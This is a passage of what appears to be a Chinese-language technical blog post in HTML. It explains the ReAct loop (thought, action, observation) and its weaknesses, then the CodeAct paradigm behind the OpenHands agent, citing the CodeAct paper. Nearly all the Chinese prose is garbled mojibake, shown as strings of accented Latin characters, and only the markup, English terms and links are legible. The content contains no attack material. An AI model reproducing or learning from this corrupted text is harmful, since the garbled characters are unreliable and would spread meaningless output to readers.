<p>è¿™ä¸ªè¿‡ç¨‹å‘¨è€Œå¤å§‹ï¼Œæ„æˆäº†åé¦ˆå¾ªç¯ï¼ˆ <strong>Thought â†’ Action â†’ Observation</strong> ï¼‰ï¼Œç›´åˆ°ä»»åŠ¡å®Œæˆï¼Œå¯¹åº”å›¾ä¾‹å¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a73c8284f4440f3a3306ce9ba948840~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606911&amp;x-signature=PdpTChY%2Bu%2F3sLfIE6VCFg9JrJcU%3D" alt="react_sequence" loading="lazy"/></p>
<p>react_sequence</p>
<p>ReAct èŒƒå¼çš„æ ¸å¿ƒæ˜¯ï¼š</p>
<ul>
<li>â€œæ¨ç†â€ å’Œ â€œè¡ŒåŠ¨â€ å½¢æˆå¾ªç¯ï¼Œå³ï¼Œè¾¹æƒ³è¾¹å¹²ï¼Œå¹²å®Œå†çœ‹ï¼Œçœ‹å®Œå†æƒ³â€</li>
<li>æ¥æ”¶åé¦ˆåé‡‡ç”¨ä»€ä¹ˆæ–¹å¼å†³ç­–ï¼Ÿä»£ç†å¿…é¡»å†³å®šæ˜¯å¦é‡å¤ï¼ˆè¿›è¡Œä¸‹ä¸€è½®æ€è€ƒï¼‰æˆ–ç»“æŸå¾ªç¯</li>
<li>å’Œç¯å¢ƒä¹‹é—´é€šä¿¡çš„ä¸Šä¸‹æ–‡å¦‚ä½•ç®¡ç†ã€‚</li>
</ul>
<p>åœ¨ OpenHands é‡Œï¼Œâ€œæ¨ç†â€ å°±æ˜¯ä»£ç†çš„ â€œæ€è€ƒè®°å½•â€ï¼šé¢å¯¹ä»»åŠ¡ç›®æ ‡å’Œä¹‹å‰çš„åé¦ˆï¼Œä»£ç†ä¼šç”Ÿæˆä¸€æ®µç±»ä¼¼ â€œå†…å¿ƒæƒ³æ³•â€ çš„å†…å®¹ï¼Œæ¯”å¦‚ â€œç°åœ¨ä»£ç æŠ¥é”™æ˜¯ç¼ºä¾èµ–åŒ…ï¼Œå¾—å…ˆæ‰§è¡Œå®‰è£…å‘½ä»¤â€ï¼Œè¿™äº›æ€è€ƒä¼šå­˜åœ¨ <code>AgentThinkAction</code> æˆ–è€…ç›¸å…³åŠ¨ä½œçš„æ€ç»´å­—æ®µé‡Œã€‚â€œè¡ŒåŠ¨â€ å°±æ˜¯æŠŠæ€è€ƒå˜æˆæœºå™¨èƒ½æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œæ¯”å¦‚ç”Ÿæˆå¸¦å…·ä½“å‘½ä»¤çš„ <code>CmdRunAction</code> å¯¹è±¡ï¼Œç¡®ä¿æ“ä½œèƒ½ç²¾å‡†è½åœ°ã€‚</p>
<h5 data-id="heading-8">2.1.2 åŸç†</h5>
<p>æœ‰ç ”ç©¶è€…æå‡ºï¼ŒAgentçš„è¿è¡Œè¿‡ç¨‹æœ¬è´¨ä¸Šå°±æ˜¯ä¸€æ¡<strong>æ¦‚ç‡é“¾ï¼ˆProbability Chainï¼‰</strong> ã€‚</p>
<p>å°†Agentè§†ä¸ºæ¦‚ç‡é“¾ï¼Œæ„å‘³ç€æˆ‘ä»¬çš„è®¾è®¡å·¥ä½œä¸å†æ˜¯â€œæ•™æ¨¡å‹è¯´è¯â€ï¼Œè€Œæ˜¯â€œæ“çºµæ¦‚ç‡â€ã€‚</p>
<p>ç›®å‰æœ€æµè¡Œçš„Agentæ¨¡å¼è«è¿‡äº<strong>ReAct (Reasoning + Acting)</strong> ã€‚ä¹Ÿå°±æ˜¯è®©æ¨¡å‹åœ¨è¡ŒåŠ¨ä¹‹å‰å…ˆç”Ÿæˆä¸€æ®µâ€œThoughtâ€ï¼ˆæ€è€ƒï¼‰ã€‚ä½†æ‚¨æœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œä¸ºä»€ä¹ˆå¤šç”Ÿæˆä¸€æ®µæ–‡å­—ï¼ˆæ€è€ƒï¼‰ï¼Œå°±èƒ½æé«˜ä»»åŠ¡æˆåŠŸç‡ï¼Ÿ</p>
<p>ç ”ç©¶è€…ç»™å‡ºäº†æ•°å­¦ä¸Šçš„è§£é‡Šï¼šå¼•å…¥â€œæ€è€ƒâ€å˜é‡ã€‚åœ¨ReActæ¡†æ¶ä¸­ï¼Œæ¦‚ç‡å…¬å¼å‘ç”Ÿäº†å˜åŒ–ã€‚æˆ‘ä»¬åœ¨çŠ¶æ€så’ŒåŠ¨ä½œaä¹‹é—´ï¼Œæ’å…¥äº†ä¸€ä¸ªä¸­é—´å˜é‡tï¼ˆThoughtï¼‰ã€‚è¿™æ„å‘³ç€ï¼š</p>
<ul>
<li><strong>å¦‚æœä¸æ€è€ƒ</strong>ï¼šæ¨¡å‹ç›´æ¥ä»çŠ¶æ€sè·³è·ƒåˆ°åŠ¨ä½œaï¼Œè¿™ä¸ªè·¨åº¦å¯èƒ½å¤ªå¤§ï¼Œå¯¼è‡´æ¦‚ç‡P(a|så¾ˆä½ï¼ˆå®¹æ˜“çè’™ï¼‰ã€‚</li>
<li><strong>å¦‚æœæ€è€ƒ</strong>ï¼šæ¨¡å‹å…ˆæ ¹æ®çŠ¶æ€sç”Ÿæˆæ€è€ƒtï¼Œç„¶ååŸºäºså’Œtå…±åŒå†³å®šåŠ¨ä½œaã€‚</li>
</ul>
<p>ç ”ç©¶è€…æŒ‡å‡ºï¼ŒReActçš„æœ¬è´¨å°±æ˜¯é€šè¿‡å¼•å…¥tï¼Œæ¥æé«˜é€‰æ‹©æ­£ç¡®açš„æ¡ä»¶æ¦‚ç‡ã€‚</p>
<p>è™½ç„¶ReActå¾ˆæœ‰æ•ˆï¼Œä½†è®ºæ–‡ä¸­ä¹Ÿæ¯«ä¸å®¢æ°”åœ°æŒ‡å‡ºäº†å®ƒçš„ç¼ºé™·ã€‚ä»æ•°å­¦ä¸Šçœ‹ï¼Œæ ‡å‡†çš„ReActå¾ªç¯æœ¬è´¨ä¸Šæ˜¯ä¸€ç§â€œéšæœºæ¸¸èµ°â€ï¼ˆRandom Walkï¼‰ã€‚</p>
<ul>
<li>å®ƒéå¸¸çµæ´»ï¼Œæ²¡æœ‰ä»»ä½•é¢„è®¾çš„è·¯å¾„ã€‚</li>
<li>ä½†ä¹Ÿæ­£å› ä¸ºç¼ºä¹çº¦æŸï¼Œå®ƒå¾ˆå®¹æ˜“å‡ºç°â€œä¸æ”¶æ•›â€çš„æƒ…å†µã€‚</li>
<li>è¡¨ç°å‡ºæ¥çš„ç—‡çŠ¶å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„â€œå¹»è§‰å¾ªç¯â€ï¼šAgentåœ¨é”™è¯¯çš„è·¯å¾„ä¸Šè¶Šèµ°è¶Šè¿œï¼Œæ‹‰ä¸å›æ¥äº†ã€‚</li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦æ›´å¤æ‚çš„æ¶æ„ï¼Œæ¯”å¦‚æ§åˆ¶æµæˆ–å¤šæ™ºèƒ½ä½“ã€‚</p>
<h5 data-id="heading-9">2.1.3 ä¼˜åŠ£</h5>
<p>ReAct èŒƒå¼çš„ä»·å€¼åœ¨äºç»™ä»£ç†å‡ ä¸ªå…³é”®èƒ½åŠ›ï¼š</p>
<ul>
<li>
<p>èƒ½çœ‹æ‡‚ï¼Œä¿ç•™å®Œæ•´çš„æ€è€ƒè®°å½•ï¼Œå¼€å‘è€…èƒ½æ¸…æ¥šçŸ¥é“ä»£ç†ä¸ºå•¥è¿™ä¹ˆåšï¼Œä¸å†æ‘¸ä¸ç€å¤´è„‘ï¼›</p>
</li>
<li>
<p>èƒ½çº é”™ï¼Œå¦‚æœè¡ŒåŠ¨å‡ºäº†é—®é¢˜ï¼ˆæ¯”å¦‚å‘½ä»¤æ‰§è¡Œå¤±è´¥ï¼‰ï¼Œä»£ç†èƒ½ç»“åˆä¹‹å‰çš„æ€è€ƒå’Œæ–°åé¦ˆè°ƒæ•´è®¡åˆ’ï¼Œä¸ä¼šä¸€ç›´åšæ— ç”¨åŠŸã€‚æ²¡æœ‰è¿™å¥—å¾ªç¯æ—¶ï¼Œæ¨¡å‹ä¸€æ¬¡è¾“å‡ºå°±ç»“æŸï¼Œæ—¢çœ‹ä¸åˆ°ä¸­é—´æƒ³æ³•ï¼Œä¹Ÿæ— æ³•è·å–å®æ—¶ä¿¡æ¯æˆ–æ‰§è¡Œä»£ç ã€‚ReAct å¼ºåˆ¶æ¨¡å‹å…ˆå†™ä¸‹ä¸€æ­¥æ‰“ç®—ï¼Œå†è°ƒç”¨å·¥å…·ï¼Œç„¶åæŠŠç»“æœå¸¦å›å»ç»§ç»­å†™æ‰“ç®—ï¼Œå¦‚æ­¤åå¤ï¼Œç›´åˆ°è®¤ä¸ºå¯ä»¥ç»™å‡ºæœ€ç»ˆç­”æ¡ˆã€‚</p>
</li>
<li>
<p>é€æ­¥æ¨è¿›ã€‚è¿™ç§é€æ­¥æ¨è¿›çš„æ–¹å¼å¸¦æ¥å››ä¸ªç›´æ¥æ•ˆæœï¼š</p>
<ul>
<li>ä»»åŠ¡å¯ä»¥æ‹†æˆå¤šæ­¥ï¼Œä¸å¿…ä¸€æ¬¡æ€§å®Œæˆï¼›</li>
<li>æ¯æ­¥ç»“æœä¼šå½±å“åç»­è®¡åˆ’ï¼Œèƒ½éšæ—¶è°ƒæ•´ï¼›</li>
<li>æ¨ç†å’Œè°ƒç”¨è®°å½•å®Œæ•´ä¿ç•™ï¼Œä¾¿äºæ£€æŸ¥ï¼›</li>
<li>å‡ºç°é”™è¯¯æ—¶æœ‰æœºä¼šä¿®æ­£ï¼ŒæˆåŠŸç‡æ›´é«˜ã€‚</li>
</ul>
</li>
<li>
<p>æ¥å¤–æŒ‚ã€‚ReActé€šè¿‡ç»“æ„åŒ–çš„æç¤ºå·¥ç¨‹ï¼Œå°†LLMçš„å¼ºå¤§æ¨ç†èƒ½åŠ›ä¸<strong>å¤–éƒ¨å·¥å…·</strong>ï¼ˆå¦‚ç½‘ç»œæœç´¢ã€è®¡ç®—å™¨ã€APIè°ƒç”¨ï¼‰ç›¸ç»“åˆã€‚è¿™å°±åƒæ˜¯ä¸ºLLMæ¥é€šäº†äº’è”ç½‘å’Œå„ç§â€œå¤–æŒ‚â€ï¼Œä½¿å…¶èƒ½å¤Ÿå¼¥è¡¥è‡ªèº«åœ¨å®æ—¶æ€§ã€è®¡ç®—å’Œäº¤äº’èƒ½åŠ›ä¸Šçš„ä¸è¶³ã€‚</p>
</li>
</ul>
<p>å®é™…åº”ç”¨ä»æœ‰å‡ ç±»éš¾ç‚¹ï¼š</p>
<ul>
<li>å¦‚ä½•æ§åˆ¶å¾ªç¯ï¼šæ¨¡å‹å¯èƒ½é™·å…¥â€æ€è€ƒâ†’è¡ŒåŠ¨â†’æ€è€ƒâ€çš„æ— é™å¾ªç¯ï¼Œæˆ–è€…è¿‡æ—©ç»“æŸ</li>
<li>å¦‚ä½•ä¿è¯å¯è§‚æµ‹ï¼šæ¨ç†è¿‡ç¨‹æ˜¯â€é»‘ç›’â€ï¼Œéš¾ä»¥è°ƒè¯•å’Œä¼˜åŒ–</li>
<li>æç¤ºè¯å¿…é¡»ä¸¥æ ¼ç²¾å¿ƒè®¾è®¡ï¼Œæ ¼å¼æˆ–æªè¾ç¨æœ‰åå·®ï¼Œæ¨¡å‹å°±ä¼šè·³è¿‡æ€è€ƒæˆ–ä¹±è°ƒç”¨ï¼›</li>
<li>æ­¥æ•°å¢å¤šåä¸Šä¸‹æ–‡è¿…é€Ÿå˜é•¿ï¼Œæ¨¡å‹å®¹æ˜“é—å¿˜æ—©æœŸä¿¡æ¯ï¼›</li>
<li>é”™è¯¯çº§è”æ•ˆåº”ã€‚åœ¨å…¸å‹çš„ ReAct çº¿æ€§ä»»åŠ¡é“¾ä¸­ï¼Œå‰ä¸€æ­¥çš„è¾“å‡ºç›´æ¥ä½œä¸ºåä¸€æ­¥çš„è¾“å…¥ï¼Œä¸€æ—¦ä¸­é€”å‡ºé”™å°±æéš¾ä¿®æ­£ã€‚</li>
<li>å·¥å…·æœ¬èº«ä¸å¯é æˆ–æ¨¡å‹é€‰é”™å·¥å…·ï¼Œä¼šå¯¼è‡´åç»­å…¨éƒ¨å¤±è´¥ã€‚å¦å¤–ï¼Œå·¥å…·è°ƒç”¨ã€ç»“æœå¤„ç†ã€é”™è¯¯æ¢å¤éœ€è¦ç»Ÿä¸€æœºåˆ¶</li>
<li>æˆæœ¬é«˜æ˜‚ï¼Œæ•ˆç‡ä½ä¸‹ã€‚æ¯ä¸€æ­¥éƒ½éœ€è¦é‡æ–°æ€è€ƒ"ä¸‹ä¸€æ­¥åšä»€ä¹ˆ"ï¼Œæ¯ä¸ªæ€è€ƒæ­¥éª¤éƒ½éœ€è¦è°ƒç”¨ LLM</li>
<li>ReAct çš„æ•ˆæœåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šä¾èµ–äº LLM è‡ªèº«çš„æ¶Œç°èƒ½åŠ›ã€‚åœ¨é¢å¯¹å…¨æ–°çš„ã€æœªè§è¿‡çš„ä»»åŠ¡æ—¶ï¼Œæ™ºèƒ½ä½“å¯èƒ½ä¼šéš¾ä»¥è¿›è¡Œæœ‰æ•ˆçš„æ¨ç†å’Œè§„åˆ’ã€‚</li>
<li>éš¾ä»¥å¹¶è¡Œã€‚æ‰€æœ‰ä»»åŠ¡å¿…é¡»ä¸²è¡Œæ‰§è¡Œï¼Œæ— æ³•åˆ©ç”¨å¹¶å‘èƒ½åŠ›</li>
<li>æµ…æ¨ç†ä¸å†²åŠ¨æ‰§è¡Œã€‚æ—©æœŸçš„ ReAct Agent æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ <strong>è¾¹æƒ³è¾¹åš</strong> çš„æ¨¡å¼ï¼šåœ¨åŒä¸€è½®ä¸­äº¤ç»‡æ¨ç†ä¸åŠ¨ä½œï¼Œä»¥å·¥å…·è°ƒç”¨ä¸ºä¸­å¿ƒç»„ç»‡æ€è·¯ã€‚å®ƒæ—¢<strong>ç¼ºä¹ å…ˆæƒ³ååš</strong> çš„å…¨å±€è§„åˆ’é˜¶æ®µï¼Œä¹Ÿ<strong>ç¼ºä¹ åšååæ€</strong> çš„ç³»ç»Ÿæ€§æ ¡æ­£æœºåˆ¶ã€‚ç»“æœæ˜¯ï¼šåœ¨éœ€è¦é•¿ç¨‹è§„åˆ’ã€å…¨å±€çº¦æŸå’Œè·¨ç³»ç»Ÿåè°ƒçš„å¤æ‚ä»»åŠ¡ä¸­ï¼Œè¿™ç±» Agent å¾€å¾€ä¼š<strong>ç›²ç›®å‰è¿›</strong>ï¼Œåœ¨å±€éƒ¨å·¥å…·è°ƒç”¨çš„æ­»èƒ¡åŒé‡Œä¸æ–­æ‰“è½¬ï¼Œè€Œæ— æ³•è·³å‡ºæ•´ä½“é‡æ–°è§„åˆ’è·¯å¾„ã€‚</li>
</ul>
<p>ç»¼ä¸Šï¼ŒReAct ä½œä¸ºæ—©æœŸ Agent çš„æ ¸å¿ƒèŒƒå¼ï¼Œåœ¨ å•ä¸€ä»»åŠ¡ã€çŸ­ä»»åŠ¡é“¾ã€å¼±çº¦æŸ çš„åœºæ™¯ä¸­ä¾ç„¶æœ‰ä»·å€¼ï¼Œä½†ä½œä¸ºä¼ä¸šçº§ã€è·¨åŸŸã€å¼ºçº¦æŸ Agent ç³»ç»Ÿçš„åŸºç¡€æ¶æ„æ—¶ï¼Œå…¶å±€é™æ€§å·²ç»æ˜¯ç»“æ„æ€§çš„ï¼Œè€Œä¸æ˜¯ç®€å•é€šè¿‡åŠ å¼ºæç¤ºè¯æˆ–å¢åŠ å·¥å…·ç§ç±»å°±èƒ½å¼¥è¡¥çš„é—®é¢˜ã€‚ä¸€æ—¦ä¸šåŠ¡èŒƒå›´æ‰©å±•åˆ°æ•°åæ¡ä¸šåŠ¡çº¿ï¼Œå åŠ ä¸¥æ ¼çš„æ•°æ®éš”ç¦»è¦æ±‚å’Œé¢‘ç¹å˜åŠ¨çš„ä¸šåŠ¡è§„åˆ™ï¼Œå•ä½“ Agent é€šå¸¸ä¼šä¸å ªé‡è´Ÿã€‚è¯•å›¾è®©ä¸€ä¸ªä¸­å¿ƒåŒ–ã€é€šç”¨çš„æ¨¡å‹å»ç†è§£æ‰€æœ‰è¯·æ±‚ã€è·¯ç”±æ‰€æœ‰å·¥å…·ã€åŒæ—¶è¿˜è¦éµå®ˆæ¯ä¸€æ¡åˆè§„ç­–ç•¥ï¼Œä¼šå¯¼è‡´ç³»ç»Ÿå¤æ‚åº¦å‘ˆæŒ‡æ•°çº§è†¨èƒ€ï¼šé…ç½®ä¸ç»´æŠ¤æˆæœ¬é£™å‡ï¼Œè¡Œä¸ºéš¾ä»¥è§£é‡Šï¼Œå¹»è§‰ä¸é”™è¯¯é¢‘å‘ã€‚</p>
<h4 data-id="heading-10">2.2 CodeAct èŒƒå¼</h4>
<p>OpenHandsæ˜¯å¼€æºç¤¾åŒºæ„é€ çš„ç¬¦åˆCodeActæ¨¡å¼çš„Single-Agentã€‚CodeActçš„æ€è·¯æ˜¯XingYao Wangåœ¨24å¹´2æœˆäº"Executable Code Actions Elicit Better LLM Agents"æå‡ºæ¥çš„ã€‚</p>
<p>è®ºæ–‡ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>Xingyao Wang, Yangyi Chen, Lifan Yuan, Yizhe Zhang, Yunzhu Li, Hao Peng, and Heng Ji. Executable Code Actions Elicit Better LLM Agents. In ICML, 2024a. 2, 3, 4, 5, 17</li>
<li>Xingyao Wang et al. OPENHANDS: AN OPEN PLATFORM FOR AI SOFTWARE DEVELOPERS AS GENERALIST AGENTS</li>
</ul>
<p>ä»£ç åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fgithub.com%2Fxingyaoww%2Fcode-act" target="_blank" title="https://link.zhihu.com/?target=https%3A//github.com/xingyaoww/code-act" ref="nofollow noopener noreferrer">github.com/xingyaoww/câ€¦</a></p>
<p>ä½œè€…åšå®¢ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fxwang.dev%2Fblog%2F2024%2Fcodeact%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//xwang.dev/blog/2024/codeact/" ref="nofollow noopener noreferrer">xwang.dev/blog/2024/câ€¦</a></p>
<p>CodeAct ä½œä¸ºé¢å‘ LLM Agent çš„å¤šè½®äº¤äº’æ¡†æ¶ï¼Œé€šè¿‡ â€œAgent - ç”¨æˆ· - ç¯å¢ƒâ€ çš„ä¸‰å…ƒè§’è‰²å®šä¹‰ï¼Œæ„å»ºäº†ä»¥ Python ä»£ç ä¸ºæ ¸å¿ƒçš„å…¨æ–°äº¤äº’æ¨¡å¼ã€‚å…¶æ ¸å¿ƒç†å¿µåœ¨äºæ‰“ç ´ä¼ ç»ŸæŒ‡ä»¤æ ¼å¼çš„å±€é™ï¼Œå°†æ‰€æœ‰ç¯å¢ƒäº¤äº’åŠ¨ä½œç»Ÿä¸€ä¸ºå¯æ‰§è¡Œçš„ä»£ç ï¼Œè®© Agent å€ŸåŠ©ä»£ç çš„å¼ºå¤§è¡¨è¾¾åŠ›æ”»å…‹å¤æ‚ä»»åŠ¡ã€‚</p>
<ul>
<li>ä¼ ç»Ÿ JSON-Schema æ¨¡å¼æŠŠæ™ºèƒ½ä½“ç¦é”¢åœ¨â€œå•æ­¥ã€å•å·¥å…·ã€å•å›è°ƒâ€çš„ç‹­çª„èµ°å»Šé‡Œï¼šLLM å…ˆè¾“å‡ºç»“æ„åŒ–æ–‡æœ¬ï¼Œå¤–éƒ¨è§£æå™¨å†é€ä¸€æ´¾å‘ï¼Œæ¯æ¢ä¸€é“å·¥å…·å°±è¦é‡æ–°èµ°ä¸€éâ€œç”Ÿæˆ-è§£æ-è°ƒç”¨â€é•¿é“¾ï¼ŒåŠ¨ä½œæ— æ³•åµŒå¥—ï¼Œé€»è¾‘æ— æ³•ä¿å­˜ï¼Œé‡åˆ°ç½‘ç»œæŠ–åŠ¨æˆ–è¿”å›æ ¼å¼å¾®è°ƒä¾¿å‰åŠŸå°½å¼ƒï¼ˆæ•°æ®æ ¼å¼è™½ç„¶å¯ä»¥ä¿è¯ï¼Œä½†æ˜¯å†…å®¹è´¨é‡å¹¶ä¸èƒ½ä¿è¯ï¼‰ï¼ŒToken è¶…é•¿å¯¼è‡´çš„æ€§èƒ½ä¸‹é™ï¼Œä¸”å¤šè½®å¯¹è¯æ—¢è¦ä¿è¯çµæ´»æ€§åˆè¦ä¿è¯é€Ÿåº¦ã€‚</li>
<li>è€Œ CodeAct é›†æˆ Python è§£é‡Šå™¨åï¼ŒLLM ç›´æ¥äº§å‡ºä»£ç ï¼Œç”±è§£é‡Šå™¨å®Œæˆä¸ç¯å¢ƒçš„äº¤äº’å¹¶è¿”å›ç»“æœï¼ŒLLM æ ¹æ®ç»“æœè°ƒæ•´æ€è·¯æˆ–ç»™å‡ºç­”æ¡ˆï¼ˆä¸€æ¬¡ä»£ç æ‰§è¡Œå³å¯åŒ…å«å¤æ‚çš„é€»è¾‘æµç¨‹ï¼‰ã€‚è¿™ç›¸å½“äºè®© LLM æ‰®æ¼”ç¨‹åºå‘˜è§’è‰²ï¼ŒPython ç¯å¢ƒä½œä¸ºæ‰§è¡ŒåŠ©æ‰‹ï¼Œä»£ç ä½œä¸ºç»Ÿä¸€çš„è¡ŒåŠ¨ç©ºé—´ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c66ab29a9a0b4de5b14ea2bc2eac5cd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg572X6KW_55qE5oCd6ICD:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769606911&amp;x-signature=zkFp55hshoHOSTp7vRQ7NhIW%2FiI%3D" alt="OpenHands-CodeAct-å¯¹æ¯”" loading="lazy"/></p>
<p>OpenHands-CodeAct-å¯¹æ¯”</p>
<h5 data-id="heading-11">2.2.1 ä¼˜åŠ¿</h5>
<p>CodeActAgent çš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li>ç»Ÿä¸€æ“ä½œç©ºé—´ï¼šå°†æ‰€æœ‰ Agent æ“ä½œç»Ÿä¸€ä¸ºä»£ç æ“ä½œ</li>
<li>å¤šåŠŸèƒ½å·¥å…·é›†ï¼šæ”¯æŒå‘½ä»¤æ‰§è¡Œã€ä»£ç è¿è¡Œã€æ–‡ä»¶æ“ä½œã€ç½‘é¡µæµè§ˆç­‰</li>
<li>æ™ºèƒ½å†å²ç®¡ç†ï¼šé€šè¿‡å‹ç¼©å’Œç¼“å­˜æœºåˆ¶ç®¡ç†é•¿å¯¹è¯å†å²</li>
<li>çµæ´»é…ç½®ï¼šå¯æ ¹æ®éœ€è¦å¯ç”¨ / ç¦ç”¨ä¸åŒåŠŸèƒ½</li>
<li>æ’ä»¶æ‰©å±•ï¼šæ”¯æŒé€šè¿‡æ’ä»¶æ‰©å±•åŠŸèƒ½</li>
<li>é«˜æ•ˆå†³ç­–ï¼šé€šè¿‡ LLM é©±åŠ¨çš„å†³ç­–è¿‡ç¨‹æ‰§è¡Œä»»åŠ¡</li>
</ul>
<p>è¿™ç§è®¾è®¡ä½¿ CodeActAgent æˆä¸ºä¸€ä¸ªåŠŸèƒ½å¼ºå¤§ä¸”çµæ´»çš„ä»£ç æ‰§è¡Œå‹ Agentï¼Œç‰¹åˆ«é€‚åˆéœ€è¦æ‰§è¡Œå¤æ‚ä»£ç ä»»åŠ¡çš„åœºæ™¯ã€‚</p>
<p>CodeAct çš„æ ¸å¿ƒæ´è§åœ¨äºï¼Œä¸å…¶è®©æ™ºèƒ½ä½“ï¼ˆAgentï¼‰æ‰®æ¼” â€œæ–‡ä¹¦â€ è§’è‰²ç”Ÿæˆé™æ€æŒ‡ä»¤ï¼Œä¸å¦‚ä½¿å…¶æˆä¸º â€œç¨‹åºå‘˜â€â€”â€” ç›´æ¥ç”Ÿæˆå¯æ‰§è¡Œçš„ Python ä»£ç ï¼Œç”±è§£é‡Šå™¨ä¸€æ¬¡æ€§æ‰§è¡Œï¼Œä»è€Œå°†é¢„è®­ç»ƒé˜¶æ®µç§¯ç´¯çš„ç¼–ç¨‹çŸ¥è¯†è½¬åŒ–ä¸ºçµæ´»çš„å³å¸­è¡ŒåŠ¨èƒ½åŠ›ã€‚CodeAct çš„æ ¸å¿ƒä¼˜åŠ¿å¯å½’çº³ä¸ºä»¥ä¸‹äº”ç‚¹ï¼š</p>
<ol>
<li><strong>è¡ŒåŠ¨ç©ºé—´çš„è·ƒè¿</strong>ï¼šä»£ç æ˜¯è¿æ¥å„ç±»å·¥å…·ä¸èƒ½åŠ›çš„é€šç”¨ â€œèƒ¶æ°´â€ã€‚å¾ªç¯ã€åˆ†æ”¯ã€å¼‚å¸¸æ•è·ã€å˜é‡èµ‹å€¼ç­‰ Python åŸç”Ÿè¯­æ³•ï¼Œä½¿ Agent èƒ½å¤Ÿåœ¨å•æ®µè„šæœ¬ä¸­ä¸²è”å¤šä¸ªå·¥å…·ã€ç¼“å­˜ä¸­é—´ç»“æœã€ä¾æ®è¿è¡Œæ—¶åé¦ˆåŠ¨æ€è°ƒæ•´ä¸‹æ¸¸è°ƒç”¨é¡ºåºï¼Œå½»åº•æ‘†è„± â€œä¸€ä¸ª JSON å¯¹åº”ä¸€æ¬¡ RPC è°ƒç”¨â€ çš„åƒµç¡¬äº¤äº’æ¨¡å¼ã€‚</li>
<li><strong>åŠ¨æ€æ€§ä¸å¯ç»„åˆæ€§</strong>ï¼šPython è¿è¡Œæ—¶å¯ä¸º Agent æä¾›å³æ—¶åé¦ˆï¼šè‹¥ä»£ç æ‰§è¡ŒæŠ›å‡ºå¼‚å¸¸ï¼ŒAgent æ•è·æ ‡å‡†é”™è¯¯è¾“å‡ºï¼ˆstderrï¼‰åï¼Œå¯åœ¨ä¸‹ä¸€è½®è¿­ä»£ä¸­è‡ªè¡Œä¿®å¤ï¼ˆself-patchï¼‰ï¼›è‹¥å¤–éƒ¨ API æ–°å¢å­—æ®µï¼Œä»…éœ€åœ¨è„šæœ¬ä¸­å¢åˆ ä¸€è¡Œä»£ç å³å¯é€‚é…ï¼Œæ— éœ€å¯¹æ¨¡å‹è¿›è¡Œé‡æ–°è®­ç»ƒã€‚æ›´è¿›ä¸€æ­¥ï¼Œå¤šä¸ªåŸå­å·¥å…·å¯è¢«å°è£…ä¸ºå‡½æ•°ï¼Œé€šè¿‡å‚æ•°ä¼ é€’å®ç° â€œç§¯æœ¨å¼â€ å¤ç”¨ â€”â€” åŒä¸€å¥—ä»£ç åº“æ—¢å¯åœ¨å®¢æœåœºæ™¯å®Œæˆå·¥å•æ±‡æ€»ï¼Œä¹Ÿå¯åœ¨è´¢åŠ¡åœºæ™¯å®ç°å‘ç¥¨æ ¸é”€ï¼ŒçœŸæ­£åšåˆ°è·¨é¢†åŸŸé›¶æˆæœ¬è¿ç§»ã€‚</li>
<li><strong>è‡ªæˆ‘è°ƒè¯•èƒ½åŠ›ä¸æˆæœ¬ä¼˜åŠ¿</strong>ï¼šé”™è¯¯æ ˆå›æº¯å¤©ç„¶æˆä¸º Agent çš„ â€œè‡ªæŸ¥çº¿ç´¢â€ã€‚å½“ä»£ç è§¦å‘ ZeroDivisionErrorï¼ˆé™¤æ•°ä¸ºé›¶é”™è¯¯ï¼‰ä¸”å®šä½åˆ°é™¤æ•°ä¸ºç©ºåˆ—è¡¨æ—¶ï¼ŒAgent å¯ç«‹å³åœ¨å±€éƒ¨é€»è¾‘ä¸­è¿½åŠ è¿‡æ»¤è¯­å¥ï¼Œæ— éœ€äººå·¥ä»‹å…¥å³å¯å®Œæˆè°ƒè¯•ï¼›åŒæ—¶ï¼Œä»£ç åŒ–çš„é€»è¾‘è¡¨è¾¾å¤§å¹…é™ä½äº†äº¤äº’å†—ä½™ï¼Œè¿›ä¸€æ­¥å‹ç¼©äº†è°ƒè¯•ä¸è¿è¡Œæˆæœ¬ã€‚</li>
<li><strong>æ›´é«˜çš„äº¤äº’æ•ˆç‡</strong>ï¼šç”±äºä»»åŠ¡é€»è¾‘è¢«å‹ç¼©åˆ°æ›´å°‘ token çš„ä»£ç å—ä¸­ï¼Œæ•´ä½“ç”Ÿæˆæˆæœ¬éšä»»åŠ¡æ­¥æ•°å‘ˆç°æ¬¡çº¿æ€§å¢é•¿ï¼Œèƒ½å¤Ÿç”¨æ›´å°‘çš„äº¤äº’è½®æ¬¡å®Œæˆæ›´å¤æ‚çš„ä»»åŠ¡ã€‚</li>
